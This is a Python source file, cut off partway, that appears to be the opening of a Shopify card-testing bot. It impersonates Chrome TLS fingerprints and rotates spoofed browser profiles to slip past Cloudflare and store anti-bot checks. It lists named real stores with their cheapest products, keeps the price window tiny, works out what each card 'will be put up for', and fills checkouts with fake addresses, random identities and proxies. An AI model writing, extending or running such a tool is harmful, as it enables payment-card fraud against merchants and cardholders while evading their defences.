import asyncio
import aiohttp
import json
import re
import random
import uuid
from urllib.parse import urlparse, quote
import threading

# ---------------------------------------------------------------------------
# curl_cffi — TLS fingerprint impersonation (Chrome JA3/JA4)
# Replaces aiohttp for all site-facing requests so Cloudflare/Shopify WAF
# cannot distinguish us from a real Chrome browser by TLS fingerprint.
# aiohttp stays for GraphQL calls (session-token-authenticated, no TLS check).
# ---------------------------------------------------------------------------
try:
    from curl_cffi.requests import AsyncSession as CurlAsyncSession
    _CURL_CFFI_AVAILABLE = True
    print("[CURL-CFFI] curl_cffi available — Chrome TLS fingerprint active")
except ImportError:
    _CURL_CFFI_AVAILABLE = False
    print("[CURL-CFFI] curl_cffi NOT installed — falling back to aiohttp (install with: pip install curl_cffi)")


# Per-site concurrency limiter — max 5 workers per site simultaneously
_site_sems = {}
_site_sem_lock = threading.Lock()
MAX_WORKERS_PER_SITE = 5

def _get_site_sem(site_key):
    with _site_sem_lock:
        if site_key not in _site_sems:
            _site_sems[site_key] = asyncio.Semaphore(MAX_WORKERS_PER_SITE)
        return _site_sems[site_key]

# Chrome impersonation target — use latest stable Chrome with strongest JA3
_IMPERSONATE_TARGET = "chrome136"

_thread_local = threading.local()

# ---------------------------------------------------------------------------
# Persisted query IDs — ANTI-BOT DETECTION 2026-07-21
# ---------------------------------------------------------------------------
PERSISTED_ID_PROPOSAL = "63010683e9bbc8784e79a2d85c7aa2a6a431fd4c2b791eebec88e95665f16e8a"
PERSISTED_ID_SUBMIT   = "d175350fa2abc713b3171bd7eee3d6443861a7c884298fde2bea9d60abbebcf6"
PERSISTED_ID_POLL     = "cb31a1b2197416d7441bf789defc306069c385c558764a58648f18cba899a29a"

# PCI vault build — confirmed from GOODHAR.har 2026-07-23
PCI_BUILD_ID = "5cdd519"

# ---------------------------------------------------------------------------
# Hard price window — NO variant outside this range is ever selected.
# Prevents selecting expensive products (>$23) or free/penny items (<$2).
# Enforced in: _pick_best_variant(), SQL lookups, and _fetch_fresh_variant().
# ---------------------------------------------------------------------------
MIN_VARIANT_PRICE = 0.10
MAX_VARIANT_PRICE = 5.00
MAX_TOTAL_PRICE = 25.00  # Final total (product + shipping + tax) can be higher


def _checkout_total(running_total, shipping_amount, tax_amount=0) -> str:
    """Real amount the card will be put up for (avoid double-counting ship).

    Shopify `runningTotal` is sometimes merchandise-only and sometimes already
    includes the selected shipping. If we always do rt+ship we overstate the
    charge (e.g. $1 + $4.90 shown as $10.80).
    """
    try:
        rt = float(running_total)
    except Exception:
        rt = 0.0
    try:
        ship = float(shipping_amount)
    except Exception:
        ship = 0.0
    try:
        tax = float(tax_amount)
    except Exception:
        tax = 0.0

    # Inclusive heuristic: rt - ship looks like a real merchandise subtotal
    if ship > 0.001 and rt >= ship:
        maybe_merch = rt - ship
        if 0.50 <= maybe_merch <= MAX_VARIANT_PRICE:
            return f"{(rt + tax):.2f}"

    return f"{(rt + ship + tax):.2f}"


# ---------------------------------------------------------------------------
# Forced variants — site → (variant_id, price_str)
# When a user targets one of these stores, skip DB/catalog lookup and always
# use this known in-window product (lowest-price SKU the operator selected).
# Keys are normalized hostnames without www.
# ---------------------------------------------------------------------------
FORCED_VARIANTS = {
    "16acfa-2.myshopify.com": ("67974958416145", "1.00"),
    "boatcarpetbuys.myshopify.com": ("33385187972", "2.99"),
    "www.glowrecipe.com": ("66730414080115", "4.00"),
    "www.gruntstyle.com": ("44977551081523", "4.99"),
    "www.burpee.com": ("45869497253922", "5.95"),
    "shop.bullymax.com": ("42647952425027", "9.99"),
    "biggerfive.myshopify.com": ("43133680877633", "16.99"),
    "www.gurneys.com": ("51622108299636", "4.99"),
    "gurneys.com": ("51622108299636", "4.99"),
    "store.trueleafmarket.com": ("40444552840", "3.39"),
    "www.springhillnursery.com": ("51949494075688", "19.49"),
    "www.brecks.com": ("55044848746862", "19.99"),
    "www.dutchbulbs.com": ("52253803282720", "20.83"),
}

# Default site rotation when mass/single leaves site blank, and on 429 switch.
# Order: Gurney's → True Leaf → Botanical → 16acfa-2
DEFAULT_SITE_ROTATION = [
    "https://16acfa-2.myshopify.com",
    "https://boatcarpetbuys.myshopify.com",
    "https://www.glowrecipe.com",
    "https://www.gruntstyle.com",
    "https://www.burpee.com",
    "https://www.gurneys.com",
    "https://shop.bullymax.com",
    "https://biggerfive.myshopify.com",
]

# ---------------------------------------------------------------------------
# Dynamic Browser Fingerprint Pool — 45 profiles, Anti-Bot Detection
# Windows/macOS/Linux × Chrome 99–150 + Edge variants
# ---------------------------------------------------------------------------
_BROWSER_PROFILES = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36", "sec_ch_ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6478.127 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6478.55 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.266 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0", "sec_ch_ua": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0", "sec_ch_ua": '"Microsoft Edge";v="124", "Chromium";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', "impersonate": "chrome123", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', "impersonate": "chrome123", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', "impersonate": "chrome123", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "impersonate": "chrome120", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "impersonate": "chrome120", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "impersonate": "chrome120", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", "sec_ch_ua": '"Microsoft Edge";v="120", "Chromium";v="120", "Not_A Brand";v="8"', "impersonate": "chrome120", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not=A?Brand";v="24"', "impersonate": "chrome119", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not=A?Brand";v="24"', "impersonate": "chrome119", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not=A?Brand";v="24"', "impersonate": "chrome119", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.188 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "impersonate": "chrome116", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "impersonate": "chrome116", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "impersonate": "chrome116", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "impersonate": "chrome116", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', "impersonate": "chrome110", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', "impersonate": "chrome110", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="107", "Google Chrome";v="107", "Not=A?Brand";v="24"', "impersonate": "chrome107", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="107", "Google Chrome";v="107", "Not=A?Brand";v="24"', "impersonate": "chrome107", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="107", "Google Chrome";v="107", "Not=A?Brand";v="24"', "impersonate": "chrome107", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36", "sec_ch_ua": '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"', "impersonate": "chrome104", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36", "sec_ch_ua": '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"', "impersonate": "chrome104", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36", "sec_ch_ua": '"Chromium";v="101", " Not;A Brand";v="99", "Google Chrome";v="101"', "impersonate": "chrome101", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36", "sec_ch_ua": '"Chromium";v="101", " Not;A Brand";v="99", "Google Chrome";v="101"', "impersonate": "chrome101", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53", "sec_ch_ua": '"Chromium";v="101", " Not;A Brand";v="99", "Microsoft Edge";v="101"', "impersonate": "chrome101", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "sec_ch_ua": '"Chromium";v="100", " Not A;Brand";v="99", "Google Chrome";v="100"', "impersonate": "chrome100", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "sec_ch_ua": '"Chromium";v="100", " Not A;Brand";v="99", "Google Chrome";v="100"', "impersonate": "chrome100", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", "sec_ch_ua": '"Chromium";v="99", " Not A;Brand";v="99", "Google Chrome";v="99"', "impersonate": "chrome99", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", "sec_ch_ua": '"Chromium";v="99", " Not A;Brand";v="99", "Google Chrome";v="99"', "impersonate": "chrome99", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46", "sec_ch_ua": '"Chromium";v="99", " Not A;Brand";v="99", "Microsoft Edge";v="99"', "impersonate": "chrome99", "platform": '"Windows"', "mobile": "?0"},
]

# Static defaults for GraphQL headers (don't rotate mid-session)
UA        = _BROWSER_PROFILES[0]["ua"]
SEC_CH_UA = _BROWSER_PROFILES[0]["sec_ch_ua"]


def pick_browser_profile() -> dict:
    """Return a random browser profile. Prefer modern Chrome (less CF friction)."""
    modern = [
        p for p in _BROWSER_PROFILES
        if p.get("impersonate") in ("chrome136", "chrome131", "chrome124", "chrome123", "chrome120")
    ]
    pool = modern if modern else _BROWSER_PROFILES
    return random.choice(pool)

# ---------------------------------------------------------------------------
# Address pool — USA Only
# ---------------------------------------------------------------------------
# Address book — keyed by currency code → matching country
# Falls back to US if currency unknown
# ---------------------------------------------------------------------------
_ADDR_BOOK = {
    "US": [
        {"address1": "4521 Broadway Ave",   "city": "Chicago",       "postalCode": "60613", "zoneCode": "IL", "phone": "3125557842"},
        {"address1": "1847 Maple Drive",    "city": "Houston",       "postalCode": "77002", "zoneCode": "TX", "phone": "7135552341"},
        {"address1": "392 Oak Street",      "city": "Phoenix",       "postalCode": "85001", "zoneCode": "AZ", "phone": "6025551234"},
        {"address1": "7834 Pine Ave",       "city": "Philadelphia",  "postalCode": "19103", "zoneCode": "PA", "phone": "2155559876"},
        {"address1": "2201 Cedar Blvd",     "city": "San Antonio",   "postalCode": "78201", "zoneCode": "TX", "phone": "2105554567"},
        {"address1": "934 Elm Street",      "city": "San Diego",     "postalCode": "92101", "zoneCode": "CA", "phone": "6195552345"},
        {"address1": "5512 Birch Lane",     "city": "Dallas",        "postalCode": "75201", "zoneCode": "TX", "phone": "2145556789"},
        {"address1": "1103 Walnut Drive",   "city": "Jacksonville",  "postalCode": "32099", "zoneCode": "FL", "phone": "9045551234"},
        {"address1": "678 Spruce Street",   "city": "Columbus",      "postalCode": "43004", "zoneCode": "OH", "phone": "6145557890"},
        {"address1": "2847 Willow Way",     "city": "Charlotte",     "postalCode": "28201", "zoneCode": "NC", "phone": "7045553456"},
        {"address1": "445 River Road",      "city": "Indianapolis",  "postalCode": "46201", "zoneCode": "IN", "phone": "3175558901"},
        {"address1": "3390 Lake View Dr",   "city": "Seattle",       "postalCode": "98101", "zoneCode": "WA", "phone": "2065552345"},
        {"address1": "1256 Highland Ave",   "city": "Denver",        "postalCode": "80201", "zoneCode": "CO", "phone": "7205551234"},
        {"address1": "889 Summit Circle",   "city": "Nashville",     "postalCode": "37201", "zoneCode": "TN", "phone": "6155557654"},
        {"address1": "724 Forest Drive",    "city": "Louisville",    "postalCode": "40201", "zoneCode": "KY", "phone": "5025556789"},
        {"address1": "4102 Sunset Blvd",    "city": "Las Vegas",     "postalCode": "89101", "zoneCode": "NV", "phone": "7025551234"},
        {"address1": "601 Park Place",      "city": "Atlanta",       "postalCode": "30301", "zoneCode": "GA", "phone": "4045556789"},
        {"address1": "2389 Hillcrest Ave",  "city": "Memphis",       "postalCode": "38101", "zoneCode": "TN", "phone": "9015559012"},
        {"address1": "3012 Meadow Lane",    "city": "Oklahoma City", "postalCode": "73101", "zoneCode": "OK", "phone": "4055553210"},
        {"address1": "1567 Valley Road",    "city": "Portland",      "postalCode": "97201", "zoneCode": "OR", "phone": "5035554567"},
    ],
    "GB": [
        {"address1": "221B Baker Street",   "city": "London",        "postalCode": "NW1 6XE", "zoneCode": "ENG", "phone": "2079460123"},
        {"address1": "14 Downing Street",   "city": "London",        "postalCode": "SW1A 2AA", "zoneCode": "ENG", "phone": "2079250918"},
        {"address1": "42 Victoria Road",    "city": "Manchester",    "postalCode": "M1 2GH",   "zoneCode": "ENG", "phone": "1612349876"},
        {"address1": "8 Princes Street",    "city": "Edinburgh",     "postalCode": "EH2 2YJ",  "zoneCode": "SCT", "phone": "1312209000"},
        {"address1": "5 Queen Street",      "city": "Cardiff",       "postalCode": "CF10 2BX", "zoneCode": "WLS", "phone": "2920223883"},
    ],
    "CA": [
        {"address1": "88 Queen Street",     "city": "Toronto",       "postalCode": "M5J 2J3",  "zoneCode": "ON",  "phone": "4165550198"},
        {"address1": "1055 West Georgia",   "city": "Vancouver",     "postalCode": "V6E 3P3",  "zoneCode": "BC",  "phone": "6045550199"},
        {"address1": "737 Hastings Street", "city": "Vancouver",     "postalCode": "V6C 3M8",  "zoneCode": "BC",  "phone": "6045559001"},
        {"address1": "100 King Street W",   "city": "Toronto",       "postalCode": "M5X 1B1",  "zoneCode": "ON",  "phone": "4165556789"},
        {"address1": "901 Jasper Ave",      "city": "Edmonton",      "postalCode": "T5J 3L7",  "zoneCode": "AB",  "phone": "7805554321"},
    ],
    "AU": [
        {"address1": "1 Martin Place",      "city": "Sydney",        "postalCode": "2000",     "zoneCode": "NSW", "phone": "291234567"},
        {"address1": "360 Collins Street",  "city": "Melbourne",     "postalCode": "3000",     "zoneCode": "VIC", "phone": "396541234"},
        {"address1": "100 St Georges Tce",  "city": "Perth",         "postalCode": "6000",     "zoneCode": "WA",  "phone": "892121234"},
        {"address1": "232 Adelaide Street", "city": "Brisbane",      "postalCode": "4000",     "zoneCode": "QLD", "phone": "731231234"},
        {"address1": "50 Grenfell Street",  "city": "Adelaide",      "postalCode": "5000",     "zoneCode": "SA",  "phone": "882031234"},
    ],
    "NZ": [
        {"address1": "157 Lambton Quay",    "city": "Wellington",    "postalCode": "6011",     "zoneCode": "WGN", "phone": "44990010"},
        {"address1": "21 Queen Street",     "city": "Auckland",      "postalCode": "1010",     "zoneCode": "AUK", "phone": "93570001"},
    ],
    "IN": [
        {"address1": "221B MG Road",        "city": "Mumbai",        "postalCode": "400001",   "zoneCode": "MH",  "phone": "9876543210"},
        {"address1": "14 Park Street",      "city": "Kolkata",       "postalCode": "700016",   "zoneCode": "WB",  "phone": "9831234567"},
        {"address1": "8 Connaught Place",   "city": "New Delhi",     "postalCode": "110001",   "zoneCode": "DL",  "phone": "9811234567"},
        {"address1": "12 Brigade Road",     "city": "Bengaluru",     "postalCode": "560001",   "zoneCode": "KA",  "phone": "9901234567"},
    ],
    "EUR": [  # generic EU fallback — used for EUR stores
        {"address1": "Unter den Linden 1",  "city": "Berlin",        "postalCode": "10117",    "zoneCode": "BE",  "phone": "3022310000", "countryCode": "DE"},
        {"address1": "1 Rue de Rivoli",     "city": "Paris",         "postalCode": "75001",    "zoneCode": "IDF", "phone": "140205000",  "countryCode": "FR"},
        {"address1": "Via del Corso 1",     "city": "Rome",          "postalCode": "00186",    "zoneCode": "RM",  "phone": "0639967700", "countryCode": "IT"},
        {"address1": "Gran Via 1",          "city": "Madrid",        "postalCode": "28013",    "zoneCode": "MD",  "phone": "915231234",  "countryCode": "ES"},
        {"address1": "Herengracht 1",       "city": "Amsterdam",     "postalCode": "1015BA",   "zoneCode": "NH",  "phone": "205551234",  "countryCode": "NL"},
    ],
    "AED": [
        {"address1": "Burj Khalifa Tower",  "city": "Dubai",         "postalCode": "00000",    "zoneCode": "DU",  "phone": "045551234"},
        {"address1": "Sheikh Zayed Road",   "city": "Abu Dhabi",     "postalCode": "00000",    "zoneCode": "AZ",  "phone": "025557890"},
    ],
    "SGD": [
        {"address1": "1 Raffles Place",     "city": "Singapore",     "postalCode": "048616",   "zoneCode": "SG",  "phone": "65551234"},
        {"address1": "9 Orchard Road",      "city": "Singapore",     "postalCode": "238880",   "zoneCode": "SG",  "phone": "67891234"},
    ],
    "HKD": [
        {"address1": "1 Nathan Road",       "city": "Kowloon",       "postalCode": "999077",   "zoneCode": "KLN", "phone": "27361234"},
        {"address1": "88 Queens Road",      "city": "Hong Kong",     "postalCode": "999077",   "zoneCode": "HKI", "phone": "25251234"},
    ],
}

# currency → ISO country code for countries with their own currency
_CURRENCY_TO_COUNTRY = {
    "USD": "US", "GBP": "GB", "CAD": "CA", "AUD": "AU", "NZD": "NZ",
    "INR": "IN", "AED": "AED", "SGD": "SGD", "HKD": "HKD",
    # All EUR zone currencies → EUR pool
    "EUR": "EUR",
}

# Keep legacy alias
US_ADDRESSES = _ADDR_BOOK["US"]

def pick_addr(currency: str = "USD") -> dict:
    """
    Return a random address matching the store's currency.
    Falls back to US if currency is unknown.
    Always injects the correct countryCode.
    """
    cc_map = {
        "US": "US", "GB": "GB", "CA": "CA", "AU": "AU", "NZ": "NZ",
        "IN": "IN", "AED": "AE", "SGD": "SG", "HKD": "HK",
        "EUR": None,  # EUR entries carry their own countryCode
    }
    pool_key = _CURRENCY_TO_COUNTRY.get((currency or "USD").upper(), "US")
    pool     = _ADDR_BOOK.get(pool_key, _ADDR_BOOK["US"])
    entry    = random.choice(pool).copy()

    # EUR entries already have countryCode baked in; others derive it from pool_key
    if "countryCode" not in entry:
        entry["countryCode"] = cc_map.get(pool_key, "US")
    return entry

# ---------------------------------------------------------------------------
# Helpers of randi names gens USA ONLY
# ---------------------------------------------------------------------------
class Utils:
    FIRSTS = ["James","John","Robert","Michael","William","David","Mary","Patricia",
              "Jennifer","Linda","Thomas","Charles","Daniel","Matthew","Anthony",
              "Jessica","Sarah","Karen","Lisa","Nancy"]
    LASTS  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
              "Rodriguez","Wilson","Martinez","Anderson","Taylor","Thomas","Moore"]

    @staticmethod
    def get_random_name():
        return random.choice(Utils.FIRSTS), random.choice(Utils.LASTS)

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com"]
        return f"{first.lower()}{last.lower()}{random.randint(10, 9999)}@{random.choice(domains)}"


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    s = proxy_str.strip()
    if "://" in s:
        p = urlparse(s)
        if p.username or p.password:
            u  = quote(p.username or "", safe="")
            pw = quote(p.password or "", safe="")
            scheme = p.scheme or "http"
            hp = f"{p.hostname}:{p.port}" if p.port else p.hostname
            return f"{scheme}://{u}:{pw}@{hp}"
        return s
    if "@" in s:
        at = s.rfind("@")
        cred, hp = s[:at], s[at+1:]
        col = cred.find(":")
